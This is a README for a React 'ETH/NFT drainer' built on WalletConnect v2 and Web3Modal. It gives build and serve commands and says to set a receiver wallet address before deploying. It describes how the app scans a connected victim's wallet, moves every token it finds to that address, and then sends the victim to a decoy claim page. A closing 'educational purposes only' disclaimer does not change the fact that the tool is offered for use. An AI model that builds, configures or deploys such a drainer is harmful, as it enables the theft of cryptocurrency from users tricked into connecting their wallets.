# ETH/NFT Drainer - React Version

This is a React-based implementation of the ETH/NFT drainer template that uses WalletConnect v2 with Web3Modal.

## Features

- WalletConnect v2 integration with Web3Modal
- React-based frontend
- Token scanning and transfer functionality
- Responsive design

## Setup

1. Install dependencies:
   ```
   npm install
   ```

2. Run the development server:
   ```
   npm run dev
   ```

3. Build for production:
   ```
   npm run build
   ```

4. Serve the production build:
   ```
   npm run serve
   ```

## Configuration

Update the receiver wallet address in [settings.js](settings.js) before deploying.

## How It Works

1. User connects their wallet using Web3Modal
2. The app automatically scans for tokens on connected networks
3. Any found tokens are transferred to the receiver address
4. User is redirected to a claim page with a notification

## Security Warning

This code is for educational purposes only. Using this code to steal funds from others is illegal and unethical.